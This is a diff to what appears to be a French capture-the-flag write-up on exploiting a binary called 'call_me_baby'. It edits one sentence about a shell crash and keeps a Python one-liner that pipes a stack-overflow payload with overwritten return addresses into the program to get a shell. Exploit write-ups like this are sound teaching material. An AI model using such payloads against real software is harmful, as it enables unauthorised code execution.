@@ -389,7 +389,7 @@ error in re-setting breakpoint 5: no symbol "gadgets" in current context.
 [inferior 1 (process 6806) exited normally]
 ```
 
-On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :
+On arrive bien au message de succès. Testons le payload directement sur l'executable :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
